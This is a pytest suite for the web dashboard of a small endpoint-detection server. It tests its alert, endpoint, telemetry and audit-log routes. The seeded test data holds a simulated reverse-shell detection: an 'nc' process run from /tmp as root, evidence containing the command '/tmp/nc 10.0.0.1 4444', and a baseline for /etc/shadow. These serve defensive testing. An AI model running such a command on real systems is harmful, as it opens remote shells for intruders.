"""Integration and UI route tests for Phase 7: Web Dashboard.

Tests:
- / redirects to /dashboard.
- /dashboard renders HTML with real data from database (KPIs, resource health, latest alerts).
- /endpoints renders HTML with endpoints matrix, status filters (online/offline), and search.
- /endpoints/<agent_id>/telemetry returns endpoint telemetry JSON (process list, baselines, metrics).
- /alerts renders HTML with incident response console, status/severity/agent filters.
- /alerts/<id>/detail returns JSON with linked security events.
- /alerts/<id>/acknowledge transitions alert status and returns JSON or redirect.
- /alerts/<id>/resolve transitions alert status with note.
- /alerts/<id>/dismiss dismisses alert as false positive.
- /events renders security audit logs.
- /static/style.css and /static/dashboard.js are served cleanly.
"""

from datetime import datetime, timezone
import pytest

from server.app import create_app
from server.repositories.alert_repository import AlertRepository
from server.repositories.baseline_repository import BaselineRepository
from server.repositories.endpoint_repository import EndpointRepository
from server.repositories.event_repository import EventRepository
from server.repositories.process_repository import ProcessRepository

TOKEN = "test-dashboard-token"


def _utc_now():
    return datetime.now(timezone.utc).isoformat()


@pytest.fixture()
def app(tmp_path):
    db_path = tmp_path / "mini_edr_dashboard_test.db"
    application = create_app({
        "TESTING": True,
        "EDR_API_TOKEN": TOKEN,
        "DATABASE_PATH": str(db_path),
        "OFFLINE_AFTER_SECONDS": 10,
    })
    application.config["TEST_DATABASE_PATH"] = db_path
    return application


@pytest.fixture()
def client(app):
    return app.test_client()


@pytest.fixture()
def seed_data(app):
    """Seed test endpoints, processes, baselines, events, and alerts."""
    db_path = app.config["DATABASE_PATH"]
    endpoint_repo = EndpointRepository(db_path)
    proc_repo = ProcessRepository(db_path)
    baseline_repo = BaselineRepository(db_path)
    event_repo = EventRepository(db_path)
    alert_repo = AlertRepository(db_path)

    # 1. Endpoints: one online, one offline
    now = _utc_now()
    old_time = "2020-01-01T00:00:00Z"

    endpoint_repo.upsert({
        "agent_id": "cyber-node-01",
        "hostname": "kali-cyber-deck",
        "os": "Kali GNU/Linux Rolling",
        "ip_address": "192.168.1.100",
        "agent_version": "1.0.0",
        "cpu_percent": 35.5,
        "memory_percent": 62.0,
        "disk_percent": 45.0,
        "uptime_seconds": 12450,
        "last_seen": now,
    })

    endpoint_repo.upsert({
        "agent_id": "cyber-node-02",
        "hostname": "ubuntu-server-prod",
        "os": "Ubuntu 24.04 LTS",
        "ip_address": "10.0.0.50",
        "agent_version": "1.0.0",
        "cpu_percent": 92.0,
        "memory_percent": 88.5,
        "disk_percent": 70.0,
        "uptime_seconds": 984500,
        "last_seen": old_time,
    })

    # 2. Process snapshot for cyber-node-01
    proc_repo.create_snapshot({
        "message_id": "snap-msg-001",
        "schema_version": "1.0",
        "agent_id": "cyber-node-01",
        "process_count": 2,
        "collected_at": now,
        "received_at": now,
    }, [
        {
            "pid": 1337,
            "ppid": 1,
            "process_name": "nc",
            "username": "root",
            "exe_path": "/tmp/nc",
            "cpu_percent": 88.0,
            "memory_percent": 12.0,
            "rss_bytes": 1048576,
            "process_started_at": now,
        },
        {
            "pid": 2000,
            "ppid": 1,
            "process_name": "python3",
            "username": "kali",
            "exe_path": "/usr/bin/python3",
            "cpu_percent": 2.5,
            "memory_percent": 15.0,
            "rss_bytes": 2048576,
            "process_started_at": now,
        },
    ])

    # 3. File Baselines
    baseline_repo.upsert({
        "agent_id": "cyber-node-01",
        "file_path": "/etc/shadow",
        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "file_size_bytes": 1240,
        "mtime_ns": 1700000000000000000,
        "file_mode": 0o640,
        "state": "present",
    })

    # 4. Security Events
    ev1 = event_repo.record({
        "message_id": "ev-msg-001",
        "agent_id": "cyber-node-01",
        "event_type": "suspicious_process_spawn",
        "severity": "critical",
        "source": "detection",
        "title": "Reverse shell executed from /tmp",
        "description": "Process /tmp/nc spawned by root",
        "evidence_json": {"pid": 1337, "cmd": "/tmp/nc 10.0.0.1 4444"},
        "occurred_at": now,
        "received_at": now,
    })

    # 5. Alert linked to ev1
    alert = alert_repo.create_or_update({
        "alert_key": "alert:cyber-node-01:proc_suspicious_dir",
        "agent_id": "cyber-node-01",
        "rule_id": "proc_suspicious_dir",
        "title": "Reverse Shell Spawned from /tmp",
        "description": "Critical reverse shell active on cyber-node-01",
        "severity": "critical",
        "status": "new",
        "first_seen_at": now,
        "last_seen_at": now,
    }, event_ids=[ev1["id"]])

    return {
        "alert": alert,
        "event": ev1,
    }


# =============================================================================
# Dashboard Overview & Static Assets Tests
# =============================================================================

def test_root_redirects_to_dashboard(client):
    """GET / redirects to /dashboard."""
    res = client.get("/")
    assert res.status_code == 302
    assert "/dashboard" in res.headers["Location"]


def test_static_assets_served(client):
    """Verify CSS and JavaScript are served with HTTP 200."""
    res_css = client.get("/static/style.css")
    assert res_css.status_code == 200
    assert "CYBERPUNK" in res_css.get_data(as_text=True)

    res_js = client.get("/static/dashboard.js")
    assert res_js.status_code == 200
    assert "acknowledgeAlert" in res_js.get_data(as_text=True)


def test_dashboard_overview_renders_live_data(client, seed_data):
    """GET /dashboard renders real database values without hardcoding."""
    res = client.get("/dashboard")
    assert res.status_code == 200
    html = res.get_data(as_text=True)

    # Check Cyberpunk theme headers
    assert "SOC COMMAND CENTER" in html
    assert "MONITORED ENDPOINTS" in html

    # Check live KPI counts: 2 total, 1 online, 1 offline
    assert "cyber-node-01" in html
    assert "Reverse Shell Spawned from /tmp" in html
    assert "CRITICAL" in html
    assert "AVG CPU UTILIZATION" in html


# =============================================================================
# Endpoints Management Tests
# =============================================================================

def test_endpoints_view_all_and_filtering(client, seed_data):
    """GET /endpoints lists endpoints and supports status filtering."""
    # All endpoints
    res_all = client.get("/endpoints")
    assert res_all.status_code == 200
    html_all = res_all.get_data(as_text=True)
    assert "kali-cyber-deck" in html_all
    assert "ubuntu-server-prod" in html_all

    # Filter online
    res_online = client.get("/endpoints?status=online")
    assert res_online.status_code == 200
    html_online = res_online.get_data(as_text=True)
    assert "kali-cyber-deck" in html_online
    assert "ubuntu-server-prod" not in html_online

    # Filter offline
    res_offline = client.get("/endpoints?status=offline")
    assert res_offline.status_code == 200
    html_offline = res_offline.get_data(as_text=True)
    assert "ubuntu-server-prod" in html_offline
    assert "kali-cyber-deck" not in html_offline


def test_endpoints_search_query(client, seed_data):
    """GET /endpoints?q=... filters by hostname, ip, or agent."""
    res_search = client.get("/endpoints?q=kali")
    assert res_search.status_code == 200
    html = res_search.get_data(as_text=True)
    assert "kali-cyber-deck" in html
    assert "ubuntu-server-prod" not in html


def test_endpoint_telemetry_modal_api(client, seed_data):
    """GET /endpoints/<agent_id>/telemetry returns detailed JSON for inspection modal."""
    res = client.get("/endpoints/cyber-node-01/telemetry")
    assert res.status_code == 200
    data = res.get_json()
    assert data["success"] is True
    assert data["endpoint"]["agent_id"] == "cyber-node-01"
    assert len(data["processes"]) == 2
    assert data["processes"][0]["process_name"] in ("nc", "python3")
    assert data["baselines_count"] == 1
    assert data["baselines"][0]["file_path"] == "/etc/shadow"

    # 404 for unknown endpoint
    assert client.get("/endpoints/unknown-agent/telemetry").status_code == 404


# =============================================================================
# Alerts & Incident Management Tests
# =============================================================================

def test_alerts_view_and_filtering(client, seed_data):
    """GET /alerts renders incident response console with filters."""
    res = client.get("/alerts")
    assert res.status_code == 200
    html = res.get_data(as_text=True)
    assert "INCIDENT RESPONSE" in html
    assert "proc_suspicious_dir" in html
    assert "Reverse Shell Spawned from /tmp" in html

    # Filter by severity=critical
    res_crit = client.get("/alerts?severity=critical")
    assert res_crit.status_code == 200
    assert "proc_suspicious_dir" in res_crit.get_data(as_text=True)

    # Filter by severity=info (should show empty table message)
    res_info = client.get("/alerts?severity=info")
    assert res_info.status_code == 200
    assert "NO INCIDENTS MATCHING" in res_info.get_data(as_text=True)


def test_alert_detail_modal_api(client, seed_data):
    """GET /alerts/<id>/detail returns JSON with linked security events."""
    alert_id = seed_data["alert"]["id"]
    res = client.get(f"/alerts/{alert_id}/detail")
    assert res.status_code == 200
    data = res.get_json()
    assert data["success"] is True
    assert data["alert"]["id"] == alert_id
    assert len(data["events"]) == 1
    assert data["events"][0]["event_type"] == "suspicious_process_spawn"

    # 404 for non-existent alert
    assert client.get("/alerts/99999/detail").status_code == 404


def test_web_alert_actions_acknowledge_and_resolve(client, seed_data):
    """Test web actions for Acknowledge and Resolve via JSON fetch."""
    alert_id = seed_data["alert"]["id"]

    # 1. Acknowledge
    res_ack = client.post(
        f"/alerts/{alert_id}/acknowledge",
        json={"note": "Investigating incident by analyst on shift"},
    )
    assert res_ack.status_code == 200
    ack_data = res_ack.get_json()
    assert ack_data["success"] is True
    assert ack_data["status"] == "acknowledged"
    assert ack_data["resolution_note"] == "Investigating incident by analyst on shift"

    # 2. Resolve
    res_res = client.post(
        f"/alerts/{alert_id}/resolve",
        json={"resolution_note": "Malicious binary removed and host sanitized"},
    )
    assert res_res.status_code == 200
    res_data = res_res.get_json()
    assert res_data["success"] is True
    assert res_data["status"] == "resolved"
    assert res_data["resolution_note"] == "Malicious binary removed and host sanitized"


def test_web_alert_action_dismiss(client, seed_data):
    """Test web action for dismissing false positives."""
    alert_id = seed_data["alert"]["id"]

    res_dism = client.post(f"/alerts/{alert_id}/dismiss", json={})
    assert res_dism.status_code == 200
    dism_data = res_dism.get_json()
    assert dism_data["success"] is True
    assert dism_data["status"] == "resolved"
    assert dism_data["dismissed"] is True
    assert "Dismissed by operator" in dism_data["resolution_note"]


# =============================================================================
# Security Events Audit View Tests
# =============================================================================

def test_events_audit_view(client, seed_data):
    """GET /events renders the security event stream and filters."""
    res = client.get("/events")
    assert res.status_code == 200
    html = res.get_data(as_text=True)
    assert "AUDIT LOG" in html
    assert "suspicious_process_spawn" in html
    assert "cyber-node-01" in html
